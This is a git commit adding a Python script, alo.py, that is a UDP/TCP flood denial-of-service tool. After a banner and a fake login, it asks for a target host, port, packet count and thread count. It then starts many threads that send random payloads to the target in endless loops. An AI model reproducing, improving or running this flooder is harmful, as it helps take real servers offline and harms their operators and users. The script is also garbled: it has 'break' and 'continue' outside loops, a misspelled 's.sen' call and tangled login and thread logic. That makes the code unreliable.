8fec59f24217955219cec1f3d45ace71add548bd
NazwanJelek <104500303+NazwanJelek@users.noreply.github.com>
2022-07-12 11:54:20 +0700

    Create alo.py

---
+++ alo.py
@@ -0,0 +1,208 @@
+import random
+import socket
+import threading
+import time
+import os,sys
+import random, socket, threading
+
+username=('Xenju')
+password=('Xenju Xyz')
+usernameget=input('Username:')
+passwordget=input('Password: ')
+break
+print("[✓] Login Successful")
+continue
+
+print("""
+\033[0;36m                 ██████ ▓██   ██▓ ███▄    █ ▄▄▄█████▓ ▄▄▄     ▒██   ██▒
+\033[0;36m               ▒██    ▒  ▒██  ██▒ ██ ▀█   █ ▓  ██▒ ▓▒▒████▄   ▒▒ █ █ ▒░
+\033[0;36m               ░ ▓██▄     ▒██ ██░▓██  ▀█ ██▒▒ ▓██░ ▒░▒██  ▀█▄ ░░  █   ░
+\033[0;36m                 ▒   ██▒  ░ ▐██▓░▓██▒  ▐▌██▒░ ▓██▓ ░ ░██▄▄▄▄██ ░ █ █ ▒ 
+\033[0;36m               ▒██████▒▒  ░ ██▒▓░▒██░   ▓██░  ▒██▒ ░  ▓█   ▓██▒██▒ ▒██▒
+\033[0;36m               ▒ ▒▓▒ ▒ ░   ██▒▒▒ ░ ▒░   ▒ ▒   ▒ ░░    ▒▒   ▓▒█▒▒ ░ ░▓ ░
+\033[0;36m               ░ ░▒  ░   ▓██ ░▒░ ░ ░░   ░ ▒░    ░      ░   ▒▒ ░░   ░▒ ░
+\033[0;36m               ░  ░  ░   ▒ ▒ ░░     ░   ░ ░   ░ ░      ░   ▒   ░    ░  
+\033[0;36m                     ░   ░ ░              ░                ░   ░    ░ 
+Ajelly""")
+print("\033[31m━━━ Gas g? (y/n)")
+choice = str(input("┗━>\033[0m:"))
+print("[0] Loading.......")
+time.sleep(1)
+print("[10] Loading......")
+time.sleep(1)
+print("[60] Loading.......")
+time.sleep(1)
+print("[100] Loading.......")
+time.sleep(1)
+print("""
+\033[0;31m                 ██████ ▓██   ██▓ ███▄    █ ▄▄▄█████▓ ▄▄▄     ▒██   ██▒
+\033[0;32m               ▒██    ▒  ▒██  ██▒ ██ ▀█   █ ▓  ██▒ ▓▒▒████▄   ▒▒ █ █ ▒░
+\033[0;33m               ░ ▓██▄     ▒██ ██░▓██  ▀█ ██▒▒ ▓██░ ▒░▒██  ▀█▄ ░░  █   ░
+\033[0;34m                 ▒   ██▒  ░ ▐██▓░▓██▒  ▐▌██▒░ ▓██▓ ░ ░██▄▄▄▄██ ░ █ █ ▒ 
+\033[0;35m               ▒██████▒▒  ░ ██▒▓░▒██░   ▓██░  ▒██▒ ░  ▓█   ▓██▒██▒ ▒██▒
+\033[0;36m               ▒ ▒▓▒ ▒ ░   ██▒▒▒ ░ ▒░   ▒ ▒   ▒ ░░    ▒▒   ▓▒█▒▒ ░ ░▓ ░
+\033[0;37m               ░ ░▒  ░   ▓██ ░▒░ ░ ░░   ░ ▒░    ░      ░   ▒▒ ░░   ░▒ ░
+\033[0;38m               ░  ░  ░   ▒ ▒ ░░     ░   ░ ░   ░ ░      ░   ▒   ░    ░  
+\033[0;39m                     ░   ░ ░              ░                ░   ░    ░ 
+""")
+time.sleep(1)
+print("\033[31m━━━ Host/IP")
+ip = str(input("┗━>\033[0m:"))
+time.sleep(1)
+print("\033[31m━━━ Port")
+port = int(input("┗━>\033[0m:"))
+time.sleep(1)
+print("\033[31m━━━ Packets")	
+times = int(input("┗━>\033[0m:"))
+time.sleep(1)
+print("\033[31m━━━ Threads")
+threads = int(input("┗━>\033[0m:"))
+def xxxxxxxxx():
+  data = random._urandom(666)
+  i = random.choice(("[•]","[•]","[•]"))
+  while True:
+    try:
+      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+      addr = (str(ip),int(port))
+      for x in range(times):
+        s.sendto(data,addr)
+        print(i +" \032m}=====> Attacking Server \033[0m%s:%s!!!"%(ip,port))
+    except:
+      print("[!] Server Attack By SYNTAX")
+
+def xxxxxxxx():
+  data = random._urandom(881)
+  i = random.choice(("[•]","[•]","[•]"))
+  while True:
+    try:
+      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+      addr = (str(ip),int(port))
+      for x in range(times):
+        s.sendto(data,addr)
+        print(i +" \032m}=====> Attacking Server \033[0m%s:%s!!!"%(ip,port))
+    except:
+      print("[!] Server Attack By SYNTAX")
+
+def xxxxxxx():
+  data = random._urandom(881)
+  i = random.choice(("[•]","[•]","[•]"))
+  while True:
+    try:
+      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+      addr = (str(ip),int(port))
+      for x in range(times):
+        s.sendto(data,addr)
+        print(i +" \032m}=====> Attacking Server \033[0m%s:%s!!!"%(ip,port))
+    except:
+      print("[!] Server Attack By SYNTAX")
+
+def xxxxxx():
+  data = random._urandom(881)
+  i = random.choice(("[•]","[•]","[•]"))
+  while True:
+    try:
+      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+      addr = (str(ip),int(port))
+      for x in range(times):
+        s.sendto(data,addr)
+        print(i +" \032m}=====> Attacking Server \033[0m%s:%s!!!"%(ip,port))
+    except:
+      print("[!] Server Attack By SYNTAX")
+
+def xxxxx():
+  data = random._urandom(1021)
+  i = random.choice(("[•]","[•]","[•]"))
+  while True:
+    try:
+      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+      addr = (str(ip),int(port))
+      for x in range(times):
+        s.sendto(data,addr)
+        print(i +" \032m}=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
+    except:
+      print("[!] Server Attack By SYNTAX")
+
+def xxxx():
+  data = random._urandom(1024)
+  i = random.choice(("[•]","[•]","[•]"))
+  while True:
+    try:
+      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+      addr = (str(ip),int(port))
+      for x in range(times):
+        s.sendto(data,addr)
+        print(i +" \032m}=====> Attacking Server \033[0m%s:%s!!!"%(ip,port))
+    except:
+      print("[!] Server Attack By SYNTAX")
+
+def xxx():
+  data = random._urandom(1024)
+  i = random.choice(("[•]","[•]","[•]"))
+  while True:
+    try:
+      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+      addr = (str(ip),int(port))
+      for x in range(times):
+        s.sen(data,addr)
+        print(i +" \032m}=====> Attacking Server \033[0m%s:%s!!!"%(ip,port))
+    except:
+      print("[!] Server Attack By SYNTAX")
+
+def xx():
+  data = random._urandom(102400)
+  i = random.choice(("[•]","[•]","[•]"))
+  while True:
+    try:
+      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+      s.connect((ip,port))
+      s.send(data)
+      for x in range(times):
+        s.send(data)
+        print(i +" \032m}=====> Attacking Server \033[0m%s:%s!!!"%(ip,port))
+    except:
+      s.close()
+      print("[!] Server Attack By SYNTAX By SYNTAX")
+
+def x():
+  data = random._urandom(991)
+  i = random.choice(("[•]","[•]","[•]"))
+  while True:
+    try:
+      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+      s.connect((ip,port))
+      s.send(data)
+      for x in range(times):
+        s.send(data)
+        print(i +" \032m}=====> Attacking Server \033[0m%s:%s!!!"%(ip,port))
+    except:
+      s.close()
+      print("[!] Server Attack By SYNTAX")
+
+for y in range(threads):
+  if usernameget==username:
+      if passwordget==password:
+          print('Succesfully')
+      else:
+          print('Password ks Wrong')
+  else:
+    print('Username is Wrong')
+    print('Username is Wrong')
+    th = threading.Thread(target = xxxxxxxxx)
+    th.start()
+    th = threading.Thread(target = xxxxxxxx)
+    th.start()
+    th = threading.Thread(target = xxxxxxx)
+    th.start()
+    th = threading.Thread(target = xxxxxx)
+    th.start()
+    th = threading.Thread(target = xxxxx)
+    th.start()
+    th = threading.Thread(target = xxxx)
+    th.start()
+    th = threading.Thread(target = xxx)
+    th.start()
+else:
+    th = threading.Thread(target = xx)
+    th.start()
+    th = threading.Thread(target = x)
+    th.start()
